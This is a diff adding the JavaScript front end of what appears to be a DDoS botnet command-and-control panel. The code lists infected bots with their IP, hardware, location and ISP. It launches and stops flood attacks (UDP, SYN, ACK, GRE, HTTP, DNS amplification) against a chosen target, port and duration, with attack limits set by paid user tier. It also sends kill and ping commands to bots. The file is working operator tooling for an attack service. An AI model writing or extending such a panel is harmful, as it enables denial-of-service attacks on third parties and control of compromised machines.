+                // Update attacks table if attack data is present
+                if (data.Attacks || data.eventType === 'attack-update') {
+                    this.updateAttacksTable(data.Attacks || []);
+                }
+                
+                // Update other dashboard components
+                this.updateDashboard(data);
+            } catch (e) {
+                console.error('Error parsing SSE message:', e);
+            }
+        };
+    
+        // Event listeners
+        this.sse.addEventListener('message', handleMessage);
+        this.sse.addEventListener('bot-connected', handleMessage);
+        this.sse.addEventListener('bot-disconnected', handleMessage);
+        
+        // Store the handler so we can remove it later
+        this.sseMessageHandler = handleMessage;
+    }
+    
+    scheduleReconnect() {
+        if (this.reconnectAttempts >= this.maxReconnectAttempts) {
+            this.showFlashMessage('Connection lost - please refresh the page', 'error');
+            return;
+        }
+    
+        const delay = Math.min(
+            this.reconnectDelayBase * Math.pow(2, this.reconnectAttempts),
+            30000 // Max 30 seconds
+        );
+        
+        console.log(`Attempting reconnect in ${delay}ms (attempt ${this.reconnectAttempts + 1})`);
+        
+        setTimeout(() => {
+            this.reconnectAttempts++;
+            this.setupSSE();
+        }, delay);
+    }
+    
+    updateDashboard(data) {
+        if (!data) {
+            console.warn('Received empty dashboard data');
+            return;
+        }
+    
+        this.updateMetrics(data);
+        this.updateAttacksTable(data.Attacks || []);
+        
+        // Only update bots if we have new data
+        if (data.Bots) {
+            this.lastBotsData = data.Bots; // Store the last received bots
+            this.updateBotsTable(data.Bots);
+        } else if (this.lastBotsData) {
+            // If no new bots data but we have previous data, use that
+            this.updateBotsTable(this.lastBotsData);
+        }
+    }
+
+    updateMetrics(data) {
+        // Update bot count
+        const botCountElements = document.querySelectorAll('.bot-count-metric');
+        if (botCountElements.length && data.BotCount !== undefined) {
+            botCountElements.forEach(el => el.textContent = data.BotCount);
+        }
+
+        // Update attack count
+        const attackCountElement = document.querySelector('.attack-count-metric');
+        if (attackCountElement && data.ActiveAttacks !== undefined && data.MaxConcurrentAttacks !== undefined) {
+            attackCountElement.textContent = `${data.ActiveAttacks}/${data.MaxConcurrentAttacks}`;
+        }
+
+        // Update attack power
+        const attackPowerElement = document.querySelector('.attack-power-metric');
+        if (attackPowerElement && data.AttackPower !== undefined) {
+            attackPowerElement.textContent = `${data.AttackPower.toFixed(2)} Gbps`;
+        }
+    }
+
+    updateAttacksTable(attacks) {
+        if (!this.domElements.attacksTable) return;
+        
+        // Convert attack duration and remaining time to readable format
+        const formattedAttacks = attacks.map(attack => {
+            return {
+                ...attack,
+                Duration: this.formatDuration(attack.Duration),
+                Remaining: this.formatRemainingTime(attack.Start, attack.Duration)
+            };
+        });
+    
+        if (formattedAttacks.length > 0) {
+            this.domElements.attacksTable.innerHTML = formattedAttacks.map(attack => `
+                <tr>
+                    <td>
+                        <span class="attack-method-badge">
+                            ${this.getMethodIcon(attack.Method)} ${this.getMethodName(attack.Method)}
+                        </span>
+                    </td>
+                    <td class="font-mono text-primary">${attack.Target || 'N/A'}:${attack.Port || 'N/A'}</td>
+                    <td class="text-primary">${attack.Duration || 'N/A'}</td>
+                    <td class="text-primary">${attack.Remaining || 'N/A'}</td>
+                    <td>
+                        <a href="/stop-attack?id=${attack.ID || ''}" class="attack-stop-btn">
+                            <i class="fas fa-stop mr-1"></i> Terminate
+                        </a>
+                    </td>
+                </tr>
+            `).join('');
+        } else {
+            this.domElements.attacksTable.innerHTML = `
+                <tr>
+                    <td colspan="5" class="text-center text-dim font-mono">No active engagements</td>
+                </tr>
+            `;
+        }
+    }
+    
+    // Helper method to format duration
+    formatDuration(seconds) {
+        if (!seconds) return 'N/A';
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        return minutes > 0 ? `${minutes}m ${remainingSeconds}s` : `${seconds}s`;
+    }
+    
+    // Helper method to calculate remaining time
+    formatRemainingTime(startTime, duration) {
+        if (!startTime || !duration) return 'N/A';
+        
+        try {
+            const start = new Date(startTime);
+            const end = new Date(start.getTime() + duration * 1000);
+            const now = new Date();
+            const remaining = Math.max(0, (end - now) / 1000); // in seconds
+            
+            return this.formatDuration(Math.round(remaining));
+        } catch (e) {
+            console.error('Error calculating remaining time:', e);
+            return 'N/A';
+        }
+    }
+
+    updateBotsTable(bots) {
+        if (!this.domElements.botsTable) return;
+        
+        // Filter out bots with no IP (invalid entries)
+        const validBots = (bots || []).filter(bot => bot.IP);
+        
+        if (validBots.length > 0) {
+            this.domElements.botsTable.innerHTML = validBots.map(bot => {
+                // Calculate if bot is active (last heartbeat within 2 minutes)
+                const isActive = this.isBotActive(bot.LastHeartbeat);
+                const location = [bot.City, bot.Region, bot.Country].filter(Boolean).join(', ') || 'Unknown';
+                const lastHeartbeat = bot.LastHeartbeat ? new Date(bot.LastHeartbeat).toLocaleString() : 'Never';
+                
+                return `
+                    <tr class="bot-row" data-bot='${JSON.stringify(bot)}'>
+                        <td>
+                            <span class="status-indicator ${isActive ? 'status-active' : 'status-inactive'}"></span>
+                            ${isActive ? 'Active' : 'Inactive'}
+                        </td>
+                        <td class="font-mono text-primary">${bot.IP || 'Unknown'}</td>
+                        <td class="text-primary">${bot.Arch || 'Unknown'}</td>
+                        <td class="text-primary">${bot.Cores || 'N/A'}</td>
+                        <td class="text-primary">${bot.RAM ? `${bot.RAM.toFixed(2)} GB` : 'N/A'}</td>
+                        <td class="text-primary">${location}</td>
+                        <td class="text-primary">${lastHeartbeat}</td>
+                    </tr>
+                `;
+            }).join('');
+        } else if (this.lastBotsData && this.lastBotsData.length > 0) {
+            // If no current bots but we have previous data, show that with inactive status
+            this.domElements.botsTable.innerHTML = this.lastBotsData.map(bot => {
+                const location = [bot.City, bot.Region, bot.Country].filter(Boolean).join(', ') || 'Unknown';
+                const lastHeartbeat = bot.LastHeartbeat ? new Date(bot.LastHeartbeat).toLocaleString() : 'Never';
+                
+                return `
+                    <tr class="bot-row" data-bot='${JSON.stringify(bot)}'>
+                        <td>
+                            <span class="status-indicator status-inactive"></span>
+                            Inactive
+                        </td>
+                        <td class="font-mono text-primary">${bot.IP || 'Unknown'}</td>
+                        <td class="text-primary">${bot.Arch || 'Unknown'}</td>
+                        <td class="text-primary">${bot.Cores || 'N/A'}</td>
+                        <td class="text-primary">${bot.RAM ? `${bot.RAM.toFixed(2)} GB` : 'N/A'}</td>
+                        <td class="text-primary">${location}</td>
+                        <td class="text-primary">${lastHeartbeat}</td>
+                    </tr>
+                `;
+            }).join('');
+        } else {
+            this.domElements.botsTable.innerHTML = `
+                <tr>
+                    <td colspan="7" class="text-center text-dim font-mono">No bots connected</td>
+                </tr>
+            `;
+        }
+    }
+
+    updateUserLevelDisplay(user) {
+        if (!user || !user.Level) return;
+        
+        const levelBadges = document.querySelectorAll('.user-level-badge');
+        if (!levelBadges.length) return;
+
+        levelBadges.forEach(badge => {
+            badge.textContent = user.Level;
+            badge.className = `user-level-badge ${this.getLevelBadgeClass(user.Level)}`;
+        });
+    }
+
+    updateConnectionStatus(connected) {
+        const statusElement = document.getElementById('connection-status');
+        const textElement = document.getElementById('connection-text');
+        
+        if (statusElement && textElement) {
+            if (connected) {
+                statusElement.className = 'status-indicator status-active';
+                statusElement.title = 'Connected';
+                textElement.textContent = 'Connected';
+                textElement.style.color = '#4ade80';
+            } else {
+                statusElement.className = 'status-indicator status-inactive';
+                statusElement.title = 'Disconnected';
+                textElement.textContent = 'Disconnected';
+                textElement.style.color = '#f87171';
+            }
+        }
+        
+        if (!connected && this.domElements.attacksTable) {
+            this.domElements.attacksTable.innerHTML = `
+                <tr>
+                    <td colspan="5" class="text-center text-dim font-mono">
+                        <i class="fas fa-sync-alt fa-spin"></i> Reconnecting...
+                    </td>
+                </tr>
+            `;
+        }
+    }
+
+    // Bot Management
+    showBotDetails(bot) {
+        // Determine if we should show as active (consider connection status)
+        const isConnected = this.sse && this.sse.readyState === EventSource.OPEN;
+        const showAsActive = isConnected && this.isBotActive(bot.LastHeartbeat);
+    
+        const modalContent = `
+            <div class="bot-details">
+                <h3 class="cyber-title">
+                    <i class="fas fa-robot text-primary"></i> Bot Details
+                </h3>
+                <div class="detail-grid">
+                    <div class="detail-row">
+                        <span class="detail-label">Status:</span>
+                        <span class="detail-value ${showAsActive ? 'text-success' : 'text-dim'}">
+                            ${showAsActive ? 'Active' : (isConnected ? 'Inactive' : 'Status Unknown')}
+                        </span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">IP Address:</span>
+                        <span class="detail-value font-mono">${bot.IP || 'Unknown'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Architecture:</span>
+                        <span class="detail-value">${bot.Arch || 'Unknown'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">CPU Cores:</span>
+                        <span class="detail-value">${bot.Cores || 'Unknown'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">RAM:</span>
+                        <span class="detail-value">${bot.RAM ? `${bot.RAM.toFixed(2)} GB` : 'Unknown'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Location:</span>
+                        <span class="detail-value">
+                            ${[bot.City, bot.Region, bot.Country].filter(Boolean).join(', ') || 'Unknown'}
+                        </span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">ISP:</span>
+                        <span class="detail-value">${bot.ISP || 'Unknown'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Last Heartbeat:</span>
+                        <span class="detail-value">${bot.LastHeartbeat ? new Date(bot.LastHeartbeat).toLocaleString() : 'Never'}</span>
+                    </div>
+                </div>
+                <div class="bot-actions">
+                    <button class="cyber-btn" onclick="sendBotCommand('PING ${bot.IP}')">
+                        <i class="fas fa-network-wired"></i> Ping Bot
+                    </button>
+                    <button class="cyber-btn" onclick="sendBotCommand('INFO ${bot.IP}')">
+                        <i class="fas fa-info-circle"></i> Get Info
+                    </button>
+                    ${this.userLevel === 'Owner' || this.userLevel === 'Admin' ? `
+                    <button class="cyber-btn destructive" onclick="if(confirm('Are you sure you want to terminate this bot?')) sendBotCommand('KILL ${bot.IP}')">
+                        <i class="fas fa-skull"></i> Terminate
+                    </button>
+                    ` : ''}
+                </div>
+            </div>
+        `;
+    
+        const modal = document.getElementById('bot-details-modal');
+        if (!modal) {
+            const newModal = document.createElement('div');
+            newModal.id = 'bot-details-modal';
+            newModal.className = 'modal';
+            newModal.innerHTML = `
+                <div class="modal-content">
+                    <button class="modal-close-btn" onclick="hideBotDetails()">
+                        <i class="fas fa-times"></i>
+                    </button>
+                    ${modalContent}
+                </div>
+            `;
+            document.body.appendChild(newModal);
+            this.showModal('bot-details-modal');
+        } else {
+            modal.querySelector('.modal-content').innerHTML = `
+                <button class="modal-close-btn" onclick="hideBotDetails()">
+                    <i class="fas fa-times"></i>
+                </button>
+                ${modalContent}
+            `;
+            this.showModal('bot-details-modal');
+        }
+    }
+
+    
+
+    // Attack Management
+    async stopAllAttacks() {
+        try {
+            const response = await fetch('/stop-all-attacks', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'X-CSRF-Token': this.csrfToken,
+                    'Content-Type': 'application/json'
+                }
+            });
+
+            if (!response.ok) {
+                throw new Error(await response.text());
+            }
+
+            this.showFlashMessage('All attacks stopped', 'success');
+        } catch (error) {
+            this.showFlashMessage(`Failed to stop attacks: ${error.message}`, 'error');
+        }
+    }
+
+    validateAttackForm() {
+        const form = this.domElements.attackForm;
+        if (!form) return false;
+    
+        // Clear previous errors
+        document.querySelectorAll('.validation-error').forEach(el => el.textContent = '');
+    
+        let isValid = true;
+        const method = form.elements.method.value;
+        const target = form.elements.ip.value;
+        const port = form.elements.port.value;
+        const duration = form.elements.duration.value;
+    
+        // Method validation
+        if (!method || !this.isCommandAllowed(method)) {
+            document.getElementById('method-error').textContent = 'Invalid attack method';
+            isValid = false;
+        }
+    
+        // Target validation (IP or hostname)
+        const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+        const hostnameRegex = /^([a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.)+[a-zA-Z]{2,}$/;
+        
+        if (!target || (!ipRegex.test(target) && !hostnameRegex.test(target))) {
+            document.getElementById('ip-error').textContent = 'Invalid IP/hostname';
+            isValid = false;
+        }
+    
+        // Port validation
+        const portNum = parseInt(port);
+        if (!port || isNaN(portNum) || portNum < 1 || portNum > 65535) {
+            document.getElementById('port-error').textContent = 'Invalid port (1-65535)';
+            isValid = false;
+        }
+    
+        // Duration validation
+        const durationNum = parseInt(duration);
+        const maxDuration = this.getMaxAttackDuration();
+        if (!duration || isNaN(durationNum) || durationNum < 10 || durationNum > maxDuration) {
+            document.getElementById('duration-error').textContent = `Invalid duration (10-${maxDuration}s)`;
+            isValid = false;
+        }
+    
+        return isValid;
+    }
+
+    isCommandAllowed(command) {
+        if (!command || !this.userLevel) return false;
+        
+        // Extract base command (first word)
+        const baseCmd = command.split(' ')[0].trim();
+        
+        // Check if command is in whitelist for user level
+        return this.commandWhitelist[this.userLevel]?.includes(baseCmd) || false;
+    }
+
+    // User Management
+    setupPasswordValidation() {
+        const passwordInput = document.getElementById('new-password');
+        if (!passwordInput) return;
+
+        passwordInput.addEventListener('input', () => {
+            const password = passwordInput.value;
+            this.updatePasswordRequirements(password);
+        });
+    }
+
+    updatePasswordRequirements(password) {
+        if (!password) {
+            Object.values(this.passwordChecks).forEach(check => {
+                check.className = 'fas fa-check-circle text-dim';
+            });
+            return;
+        }
+
+        // Check length (min 12 chars)
+        if (password.length >= 12) {
+            this.passwordChecks.length.className = 'fas fa-check-circle text-success';
+        } else {
+            this.passwordChecks.length.className = 'fas fa-check-circle text-dim';
+        }
+
+        // Check case (both upper and lower)
+        if (/[a-z]/.test(password) && /[A-Z]/.test(password)) {
+            this.passwordChecks.case.className = 'fas fa-check-circle text-success';
+        } else {
+            this.passwordChecks.case.className = 'fas fa-check-circle text-dim';
+        }
+
+        // Check number
+        if (/\d/.test(password)) {
+            this.passwordChecks.number.className = 'fas fa-check-circle text-success';
+        } else {
+            this.passwordChecks.number.className = 'fas fa-check-circle text-dim';
+        }
+
+        // Check special character
+        if (/[^a-zA-Z0-9]/.test(password)) {
+            this.passwordChecks.special.className = 'fas fa-check-circle text-success';
+        } else {
+            this.passwordChecks.special.className = 'fas fa-check-circle text-dim';
+        }
+    }
+
+    // Utility Methods
+    getMethodIcon(method) {
+        const icons = {
+            '!udpflood': 'fa-bolt',
+            '!udpsmart': 'fa-brain',
+            '!tcpflood': 'fa-network-wired',
+            '!synflood': 'fa-sync',
+            '!ackflood': 'fa-reply',
+            '!greflood': 'fa-project-diagram',
+            '!dns': 'fa-server',
+            '!http': 'fa-globe',
+            'default': 'fa-question'
+        };
+        return `<i class="fas ${icons[method] || icons.default}"></i>`;
+    }
+
+    getMethodName(method) {
+        const names = {
+            '!udpflood': 'UDP Flood',
+            '!udpsmart': 'UDP Smart',
+            '!tcpflood': 'TCP Flood',
+            '!synflood': 'SYN Flood',
+            '!ackflood': 'ACK Flood',
+            '!greflood': 'GRE Flood',
+            '!dns': 'DNS Amplification',
+            '!http': 'HTTP Flood',
+            'default': method
+        };
+        return names[method] || names.default;
+    }
+
+    isBotActive(lastHeartbeat) {
+        if (!lastHeartbeat) return false;
+        try {
+            const now = new Date();
+            const heartbeat = new Date(lastHeartbeat);
+            return (now - heartbeat) <= 60000; // 1 minute
+        } catch (e) {
+            console.error('Error checking bot activity:', e);
+            return false;
+        }
+    }
+
+    getLevelBadgeClass(level) {
+        const levelMap = {
+            'Owner': 'cyber-badge-owner',
+            'Admin': 'cyber-badge-admin',
+            'Pro': 'cyber-badge-stealth',
+            'Basic': 'cyber-badge-maintenance',
+            'default': 'cyber-badge-user'
+        };
+        return levelMap[level] || levelMap.default;
+    }
+
+    getMaxAttackDuration() {
+        switch (this.userLevel) {
+            case 'Owner': return 3600;
+            case 'Admin': return 1800;
+            case 'Pro': return 600;
+            case 'Basic': return 300;
+            default: return 60;
+        }
+    }
+
+    isValidIP(ip) {
+        return /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip);
+    }
+
+    isValidHostname(hostname) {
+        return /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+$/.test(hostname);
+    }
+
+    // Modal Management
+    showModal(modalId) {
+        this.hideAllModals();
+        const modal = document.getElementById(modalId);
+        if (modal) {
+            modal.classList.remove('hidden');
+            this.activeModal = modalId;
+            document.body.classList.add('no-scroll');
+        }
+    }
+
+    hideModal() {
+        if (this.activeModal) {
+            const modal = document.getElementById(this.activeModal);
+            if (modal) modal.classList.add('hidden');
+            this.activeModal = null;
+            document.body.classList.remove('no-scroll');
+        }
+    }
+
+    hideAllModals() {
+        document.querySelectorAll('.overlay').forEach(modal => {
+            modal.classList.add('hidden');
+        });
+        if (this.domElements.profileDropdown) {
+            this.domElements.profileDropdown.classList.add('hidden');
+        }
+        this.activeModal = null;
+        document.body.classList.remove('no-scroll');
+    }
+
+    switchTab(tabName) {
+        // Hide all tab contents
+        const activeModal = document.getElementById(this.activeModal);
+        if (activeModal) {
+            activeModal.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Deactivate all tab buttons
+            activeModal.querySelectorAll('.tab-button').forEach(button => {
+                button.classList.remove('active');
+            });
+        }
+        
+        // Activate selected tab
+        const content = document.getElementById(`${tabName}-content`);
+        const tab = document.getElementById(`${tabName}-tab`);
+        
+        if (content) content.classList.add('active');
+        if (tab) tab.classList.add('active');
+    }
+
+    // Admin Panel
+    showAdminPanel() {
+        if (this.userLevel !== 'Owner' && this.userLevel !== 'Admin') {
+            this.showFlashMessage('Access denied: Admin privileges required', 'error');
+            return;
+        }
+        
+        const adminOverlay = document.getElementById('admin-overlay');
+        if (adminOverlay) {
+            adminOverlay.classList.remove('hidden');
+            document.body.classList.add('no-scroll');
+            this.activeModal = 'admin-overlay';
+            
+            // Initialize with users tab
+            this.switchTab('users');
+            
+            // Hide settings tab if not owner
+            const settingsTab = document.getElementById('settings-tab');
+            if (settingsTab) {
+                settingsTab.style.display = this.userLevel === 'Owner' ? 'block' : 'none';
+            }
+            
+            // Make sure the form is hidden initially
+            this.hideAddUserForm();
+        }
+    }
+
+    showAddUserForm() {
+        const form = document.getElementById('add-user-form');
+        if (form) {
+            form.classList.remove('hidden');
+            // Reset form
+            form.reset();
+            // Reset validation indicators
+            Object.values(this.passwordChecks).forEach(check => {
+                check.className = 'fas fa-check-circle text-dim';
+            });
+        }
+    }
+
+    hideAddUserForm() {
+        const form = document.getElementById('add-user-form');
+        if (form) form.classList.add('hidden');
+    }
+
+    // Bot List Refresh
+    async refreshBotList() {
+        try {
+            const response = await fetch('/api/user-data', {
+                credentials: 'include',
+                headers: {
+                    'X-CSRF-Token': this.csrfToken
+                }
+            });
+
+            if (!response.ok) {
+                throw new Error(await response.text());
+            }
+
+            const data = await response.json();
+            this.updateBotsTable(data.Bots || []);
+            this.showFlashMessage('Bot list refreshed', 'success');
+        } catch (error) {
+            this.showFlashMessage(`Failed to refresh bot list: ${error.message}`, 'error');
+        }
+    }
+
+    // Event Handling
+    setupEventListeners() {
+        // Profile dropdown toggle
+        if (this.domElements.profileButton && this.domElements.profileDropdown) {
+            this.domElements.profileButton.addEventListener('click', (e) => {
+                e.stopPropagation();
+                this.domElements.profileDropdown.classList.toggle('hidden');
+            });
+        }
+
+        // Admin console button
+        const adminConsoleBtn = document.getElementById('admin-console-btn');
+        if (adminConsoleBtn) {
+            adminConsoleBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                this.showAdminPanel();
+                // Close the dropdown if open
+                if (this.domElements.profileDropdown) {
+                    this.domElements.profileDropdown.classList.add('hidden');
+                }
+            });
+        }
+
+        document.querySelectorAll('.tab-button').forEach(button => {
+            button.addEventListener('click', (e) => {
+                const tabName = e.currentTarget.dataset.tab;
+                this.switchTab(tabName);
+            });
+        });
+
+        // Close dropdown when clicking outside
+        document.addEventListener('click', (e) => {
+            if (this.domElements.profileDropdown && 
+                !this.domElements.profileDropdown.contains(e.target) && 
+                !this.domElements.profileButton.contains(e.target)) {
+                this.domElements.profileDropdown.classList.add('hidden');
+            }
+        });
+
+        // Bot row clicks
+        document.addEventListener('click', (e) => {
+            const botRow = e.target.closest('.bot-row');
+            if (botRow) {
+                const botData = JSON.parse(botRow.dataset.bot);
+                this.showBotDetails(botData);
+            }
+        });
+
+        // Attack form validation
+        if (this.domElements.attackForm) {
+            this.domElements.attackForm.addEventListener('input', () => {
+                this.validateAttackForm();
+            });
+
+            this.domElements.attackForm.addEventListener('submit', (e) => {
+                const submitButton = e.target.querySelector('button[type="submit"]');
+                if (submitButton) {
+                    submitButton.disabled = true;
+                    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Launching...';
+                }
+            });
+        }
+
+        // Close modals when clicking outside
+        document.addEventListener('click', (e) => {
+            if (e.target.classList.contains('overlay')) {
+                this.hideModal();
+            }
+        });
+
+        // Close modals with escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                this.hideModal();
+            }
+        });
+    }
+
+    // UI Helpers
+    showFlashMessage(message, type = 'info') {
+        // Remove any existing flash messages
+        document.querySelectorAll('.cyber-flash').forEach(el => el.remove());
+        
+        // Create new flash message
+        const flashContainer = document.createElement('div');
+        flashContainer.className = `cyber-flash ${type}`;
+        flashContainer.innerHTML = `
+            <span class="font-mono">${message}</span>
+            <button class="cyber-flash-btn" onclick="this.parentElement.remove()">
+                <i class="fas fa-times"></i>
+            </button>
+        `;
+        
+        // Add to DOM
+        document.body.prepend(flashContainer);
+        
+        // Auto-dismiss after 5 seconds
+        setTimeout(() => {
+            flashContainer.style.opacity = '0';
+            setTimeout(() => flashContainer.remove(), 300);
+        }, 5000);
+    }
+
+    // Cleanup
+    cleanup() {
+        // Close SSE connection
+        if (this.sse && this.sseMessageHandler) {
+            this.sse.removeEventListener('message', this.sseMessageHandler);
+            this.sse.removeEventListener('bot-connected', this.sseMessageHandler);
+            this.sse.removeEventListener('bot-disconnected', this.sseMessageHandler);
+        }
+        
+        if (this.sse) {
+            this.sse.close();
+            this.sse = null;
+        }
+        
+        // Abort pending requests
+        this.pendingRequests.forEach((controller, key) => {
+            controller.abort();
+            this.pendingRequests.delete(key);
+        });
+
+        // Remove all event listeners
+        this.eventListeners.forEach((listeners, type) => {
+            listeners.forEach(listener => {
+                document.removeEventListener(type, listener);
+            });
+        });
+        this.eventListeners.clear();
+    }
+}
+
+// Utility functions
+function togglePasswordVisibility(inputId) {
+    const input = document.getElementById(inputId);
+    if (input) {
+        const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
+        input.setAttribute('type', type);
+        
+        const toggleBtn = input.nextElementSibling;
+        if (toggleBtn) {
+            toggleBtn.querySelector('i').className = type === 'password' ? 'fas fa-eye' : 'fas fa-eye-slash';
+        }
+    }
+}
+
+function copyToClipboard(text) {
+    if (!text) return;
+    
+    navigator.clipboard.writeText(text).then(() => {
+        const dashboard = window.dashboard || new DashboardState();
+        dashboard.showFlashMessage('Copied to clipboard', 'success');
+    }).catch(err => {
+        console.error('Failed to copy:', err);
+        const dashboard = window.dashboard || new DashboardState();
+        dashboard.showFlashMessage('Failed to copy to clipboard', 'error');
+    });
+}
+
+Object.defineProperty(window, 'RTCPeerConnection', {
+    value: function() {
+        console.error('WebRTC is disabled for security');
+        throw new Error('WebRTC is disabled');
+    },
+    writable: false,
+    configurable: false
+});
+
+// Disable other WebRTC-related objects
+['webkitRTCPeerConnection', 'mozRTCPeerConnection', 'RTCIceCandidate', 
+ 'RTCPeerConnectionIceEvent', 'RTCSessionDescription'].forEach(function(prop) {
+    Object.defineProperty(window, prop, {
+        value: null,
+        writable: false,
+        configurable: false
+    });
+});
+
+async function sendBotCommand(command) {
+    try {
+        const dashboard = window.dashboard || new DashboardState();
+        const response = await fetch('/admin-command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-CSRF-Token': dashboard.csrfToken
+            },
+            body: `command=${encodeURIComponent(command)}`,
+            credentials: 'include'
+        });
+
+        if (!response.ok) {
+            throw new Error(await response.text());
+        }
+
+        dashboard.showFlashMessage('Command sent successfully', 'success');
+        dashboard.hideModal();
+    } catch (error) {
+        const dashboard = window.dashboard || new DashboardState();
+        dashboard.showFlashMessage(`Command failed: ${error.message}`, 'error');
+    }
+}
+
+// Initialize dashboard when DOM is loaded
+document.addEventListener('DOMContentLoaded', () => {
+    const dashboard = new DashboardState();
+    dashboard.init();
+
+    // Expose methods to global scope
+    window.dashboard = dashboard;
+    window.showAdminPanel = () => dashboard.showAdminPanel();
+    window.hideAdminPanel = () => dashboard.hideModal();
+    window.stopAllAttacks = () => dashboard.stopAllAttacks();
+    window.hideBotDetails = () => dashboard.hideModal();
+    window.switchTab = (tabName) => dashboard.switchTab(tabName);
+    window.showAddUserForm = () => dashboard.showAddUserForm();
+    window.hideAddUserForm = () => dashboard.hideAddUserForm();
+    window.togglePasswordVisibility = togglePasswordVisibility;
+    window.copyToClipboard = copyToClipboard;
+    window.sendBotCommand = sendBotCommand;
+    window.refreshBotList = () => dashboard.refreshBotList();
+});
+    </script>
+</body>
+</html>
